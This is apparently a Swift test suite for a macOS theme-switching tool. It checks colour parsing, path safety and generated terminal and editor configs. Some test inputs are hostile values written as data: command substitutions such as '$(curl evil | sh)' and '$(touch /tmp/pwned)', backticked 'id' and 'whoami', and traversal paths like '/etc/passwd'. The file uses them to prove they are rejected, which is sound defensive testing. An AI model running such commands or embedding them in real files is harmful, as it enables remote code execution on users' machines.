import Foundation
import ArthemeKit

var failures: [String] = []

func check(_ name: String, _ ok: Bool, _ detail: @autoclosure () -> String = "") {
    print("  \(ok ? "ok  " : "FAIL")  \(name)" + (ok ? "" : "  — \(detail())"))
    if !ok { failures.append(name) }
}

func theme(_ body: String) throws -> Theme {
    let dir = URL(fileURLWithPath: NSTemporaryDirectory())
        .appendingPathComponent("artheme-test-\(UUID().uuidString)")
    try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
    try body.write(to: dir.appendingPathComponent("colors.toml"),
                   atomically: true, encoding: .utf8)
    return try Theme.load(directory: dir)
}

print("colour parsing")
// The values that made the shell version executable.
check("rejects command substitution", Color("#ff8800$(touch /tmp/pwned)") == nil)
check("rejects backticks", Color("#ff8800`id`") == nil)
check("rejects words", Color("red") == nil)
check("rejects short hex", Color("#12345") == nil)
check("expands 3-digit hex", Color("#fff")?.hex == "#ffffff")
check("accepts hex without #", Color("eeeeee")?.hex == "#eeeeee")
check("drops the alpha channel", Color("#ff8800cc")?.hex == "#ff8800")
check("mixes", Color("#000000")!.mixed(with: Color("#ffffff")!, 0.5).hex == "#808080")
check("alpha comes first for sketchybar",
      Color("#ffffff")!.sketchybar(alpha: 0xf0) == "0xf0ffffff")

print("theme files")
do {
    _ = try theme("""
    background = "#1a1a1a"
    foreground = "#eeeeee"
    accent = "#ff8800$(curl evil | sh)"
    """)
    check("refuses an injected colour", false, "it loaded")
} catch {
    check("refuses an injected colour", true)
}

if let t = try? theme("""
   name = "Fine $(id) `x` name"
   background = "#1a1a1a"
   foreground = "#eeeeee"
   """) {
    check("strips shell characters from names",
          !t.name.contains("$") && !t.name.contains("`"), t.name)
} else { check("strips shell characters from names", false, "did not load") }

if let t = try? theme("""
   background = "#f1f3ea"
   foreground = "#333333"
   red = "#aa0000"
   blue = "#0000aa"
   mode = "light"
   """) {
    check("semantic scheme maps to the palette",
          t.palette[1].hex == "#aa0000" && t.palette[4].hex == "#0000aa")
    check("mode is honoured", t.appearance == .light)
} else { check("semantic scheme maps to the palette", false, "did not load") }

if let t = try? theme("""
   background = "#111111"
   foreground = "#eeeeee"
   appearance = "neither"
   """) {
    check("invalid appearance falls back to luminance", t.appearance == .dark)
}

print("paths")
let parent = URL(fileURLWithPath: "/tmp/artheme-parent")
for bad in ["../escape", "..", ".", "/etc/passwd", ".hidden", "a/b", ""] {
    check("refuses \(bad.isEmpty ? "an empty name" : bad)",
          Paths.safeChild(of: parent, named: bad) == nil)
}
// The regression that hid every bundled theme: resolvingSymlinksInPath strips
// /private only for paths that already exist, so an existing parent under /tmp
// and a child that does not exist yet compared as "outside".
let symlinked = URL(fileURLWithPath: "/tmp")
    .appendingPathComponent("artheme-symlink-\(UUID().uuidString)")
try? FileManager.default.createDirectory(at: symlinked, withIntermediateDirectories: true)
check("accepts a name under a symlinked directory",
      Paths.safeChild(of: symlinked, named: "batou") != nil)
try? FileManager.default.removeItem(at: symlinked)

// MARK: - Integrations

/// A throwaway home plus library, and a machine that writes files but signals
/// nothing: the tests must not reload the bar or repaint the desktop of
/// whoever is running them.
func fixture() throws -> (Machine, Library, Theme) {
    let home = URL(fileURLWithPath: NSTemporaryDirectory())
        .appendingPathComponent("artheme-home-\(UUID().uuidString)")
    try FileManager.default.createDirectory(at: home, withIntermediateDirectories: true)
    let library = Library(root: home.appendingPathComponent(".config/artheme"))
    try library.ensureDirectories()
    let dir = library.themesDirectory.appendingPathComponent("probe")
    try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
    try """
    name = "Probe"
    background = "#121212"
    foreground = "#a4a4a4"
    accent = "#e68e0d"
    color0 = "#121212"
    color1 = "#c04040"
    color2 = "#40a040"
    color3 = "#c0a040"
    color4 = "#4060c0"
    color5 = "#8040c0"
    color6 = "#40a0a0"
    color7 = "#a4a4a4"
    color15 = "#ffffff"
    """.write(to: dir.appendingPathComponent("colors.toml"), atomically: true, encoding: .utf8)
    return (Machine(home: home, appliesLive: false), library, try Theme.load(directory: dir))
}

func body(_ url: URL) -> String { (try? String(contentsOf: url, encoding: .utf8)) ?? "" }
func json(_ url: URL) -> [String: Any]? {
    guard let d = try? Data(contentsOf: url) else { return nil }
    return (try? JSONSerialization.jsonObject(with: d)) as? [String: Any]
}

print("integrations write what they promise")
let (machine, lib, probe) = try fixture()

_ = try GhosttyIntegration(machine: machine).apply(probe, lib)
let ghostty = body(lib.generated.appendingPathComponent("ghostty.conf"))
check("ghostty: 16 palette entries",
      ghostty.components(separatedBy: "palette = ").count == 17)
check("ghostty: background", ghostty.contains("background = #121212"))

_ = try KittyIntegration(machine: machine).apply(probe, lib)
let kitty = body(lib.generated.appendingPathComponent("kitty.conf"))
check("kitty: colours", kitty.contains("color0 #121212") && kitty.contains("color15 #ffffff"))

_ = try AlacrittyIntegration(machine: machine).apply(probe, lib)
let alacritty = body(lib.generated.appendingPathComponent("alacritty.toml"))
check("alacritty: sections",
      alacritty.contains("[colors.primary]") && alacritty.contains("[colors.bright]")
      && alacritty.contains("background = \"#121212\""))

_ = try WezTermIntegration(machine: machine).apply(probe, lib)
let wez = body(machine.config("wezterm/colors/artheme.toml"))
check("wezterm: scheme name and 8+8 colours",
      wez.contains("name = \"Artheme\"") && wez.contains("ansi = [") && wez.contains("brights = ["))

_ = try ITerm2Integration(machine: machine).apply(probe, lib)
let iterm = json(machine.library("Application Support/iTerm2/DynamicProfiles/artheme.json"))
let profile = (iterm?["Profiles"] as? [[String: Any]])?.first
check("iterm2: profile with a stable guid",
      profile?["Name"] as? String == "Artheme" && profile?["Guid"] != nil)
check("iterm2: 16 ansi colours",
      (0..<16).allSatisfy { profile?["Ansi \($0) Color"] != nil })
check("iterm2: components are 0…1 floats",
      ((profile?["Background Color"] as? [String: Any])?["Red Component"] as? Double).map
      { $0 >= 0 && $0 <= 1 } ?? false)

_ = try SketchyBarIntegration(machine: machine).apply(probe, lib)
let sb = body(lib.generated.appendingPathComponent("sketchybar-colors.sh"))
check("sketchybar: alpha first", sb.contains("export BAR_COLOR='0xf0121212'"))

_ = try BordersIntegration(machine: machine).apply(probe, lib)
let borders = body(machine.config("borders/bordersrc"))
check("borders: accent as active colour", borders.contains("active_color=0xffe68e0d"))

_ = try VSCodeIntegration(machine: machine).apply(probe, lib)
let code = json(machine.home.appendingPathComponent(
    ".vscode/extensions/artheme-theme/themes/artheme-color-theme.json"))
check("vscode: dark type follows the theme", code?["type"] as? String == "dark")
check("vscode: terminal ansi colours",
      (code?["colors"] as? [String: String])?["terminal.ansiRed"] == "#c04040")

_ = try NeovimIntegration(machine: machine).apply(probe, lib)
let nvim = body(machine.config("nvim/colors/artheme.lua"))
check("neovim: names itself and sets background",
      nvim.contains("vim.g.colors_name = \"artheme\"") && nvim.contains("vim.o.background = \"dark\""))
check("neovim: 16 terminal colours",
      (0..<16).allSatisfy { nvim.contains("terminal_color_\($0) =") })

_ = try ZedIntegration(machine: machine).apply(probe, lib)
let zed = json(machine.config("zed/themes/artheme.json"))
let zedTheme = (zed?["themes"] as? [[String: Any]])?.first
check("zed: family with one theme", zed?["name"] as? String == "Artheme")
check("zed: appearance and ansi",
      zedTheme?["appearance"] as? String == "dark"
      && (zedTheme?["style"] as? [String: String])?["terminal.ansi.red"] == "#c04040")

_ = try BtopIntegration(machine: machine).apply(probe, lib)
let btop = body(machine.config("btop/themes/artheme.theme"))
check("btop: main colours", btop.contains("theme[main_bg]=\"#121212\"")
      && btop.contains("theme[hi_fg]=\"#e68e0d\""))

_ = try TmuxIntegration(machine: machine).apply(probe, lib)
let tmux = body(lib.generated.appendingPathComponent("tmux.conf"))
check("tmux: status and active border",
      tmux.contains("status-style") && tmux.contains("pane-active-border-style \"fg=#e68e0d\""))

// herdr only rewrites an existing config, and must leave the rest of it alone.
let herdrConf = machine.config("herdr/config.toml")
try Files.write("""
# a comment the user wrote
[server]
port = 1234

[theme]
name = "something"

[theme.custom]
accent = "#000000"
""", to: herdrConf)
_ = try HerdrIntegration(machine: machine).apply(probe, lib)
let herdr = body(herdrConf)
check("herdr: keeps the user's own config",
      herdr.contains("# a comment the user wrote") && herdr.contains("port = 1234"))
check("herdr: rewrites the custom block", herdr.contains("accent = \"#e68e0d\""))
check("herdr: one custom block only",
      herdr.components(separatedBy: "[theme.custom]").count == 2)

print("running commands")
// The regression that made a theme switch change the wallpaper and nothing
// else: output bigger than the 64 KB pipe buffer used to deadlock, time out
// and come back empty, so no terminal was ever found to reload.
let big = URL(fileURLWithPath: NSTemporaryDirectory())
    .appendingPathComponent("artheme-big-\(UUID().uuidString).txt")
try String(repeating: "x", count: 400_000).write(to: big, atomically: true, encoding: .utf8)
let start = Date()
let cat = Shell.run("/bin/cat", [big.path], timeout: 5)
check("reads output larger than a pipe buffer",
      cat.status == 0 && cat.out.count == 400_000, "\(cat.status), \(cat.out.count) bytes")
check("and does not sit on the timeout", Date().timeIntervalSince(start) < 2,
      "\(Date().timeIntervalSince(start))s")
try? FileManager.default.removeItem(at: big)

// ps is the specific caller that broke: ~77 KB on a busy machine.
let ps = Shell.run("/bin/ps", ["-Ao", "pid=,comm="], timeout: 5)
check("ps comes back in full", ps.status == 0 && ps.out.count > 1000, "\(ps.out.count) bytes")
check("and its own process is in there",
      Shell.pids(of: "launchd").contains(1) || !Shell.pids(of: "ps").isEmpty
      || ps.out.contains("launchd"))

print("the desktop arbiter")
// Download and apply run in parallel, so either order is possible and a
// photograph must win both ways.
let arbiter = WallpaperArbiter.shared
var round = arbiter.newRound()
check("flat colour claims an empty round", arbiter.claim(.flatColour, round: round))
check("a photograph beats it afterwards", arbiter.claim(.photograph, round: round))
round = arbiter.newRound()
check("a photograph claims an empty round", arbiter.claim(.photograph, round: round))
check("the flat colour never overwrites it", !arbiter.claim(.flatColour, round: round))
check("a second photograph does not flicker over the first",
      !arbiter.claim(.photograph, round: round))
round = arbiter.newRound()
check("a new switch starts over", arbiter.claim(.flatColour, round: round))

// The bug this exists for: a download that outlives the switch that started it
// must not paint the previous theme's picture over the new theme.
let stale = arbiter.newRound()
let current = arbiter.newRound()
check("a late download from a previous switch is refused",
      !arbiter.claim(.photograph, round: stale))
check("and the current switch still gets the desktop",
      arbiter.claim(.photograph, round: current))

print("nothing executable reaches a generated file")
// A theme whose free text is hostile: every generated file must stay inert.
let (machine2, lib2, _) = try fixture()
let nasty = lib2.themesDirectory.appendingPathComponent("nasty")
try FileManager.default.createDirectory(at: nasty, withIntermediateDirectories: true)
try """
name = "Evil $(id) `whoami` \\"quoted\\""
background = "#101010"
foreground = "#f0f0f0"
""".write(to: nasty.appendingPathComponent("colors.toml"), atomically: true, encoding: .utf8)
let nastyTheme = try Theme.load(directory: nasty)
for integration in Switcher.all(machine: machine2) {
    _ = try? integration.apply(nastyTheme, lib2)
}
var dirty: [String] = []
if let walker = FileManager.default.enumerator(at: machine2.home, includingPropertiesForKeys: nil) {
    for case let url as URL in walker where url.pathExtension != "" {
        // themes/ holds the input files — the hostile colors.toml lives there.
        guard !url.path.contains("/themes/") else { continue }
        let text = body(url)
        if text.contains("$(") || text.contains("`") { dirty.append(url.lastPathComponent) }
    }
}
check("no command substitution in any generated file", dirty.isEmpty, dirty.joined(separator: ", "))

print()
if failures.isEmpty { print("all good") } else {
    print("\(failures.count) failing: \(failures.joined(separator: ", "))")
    exit(1)
}
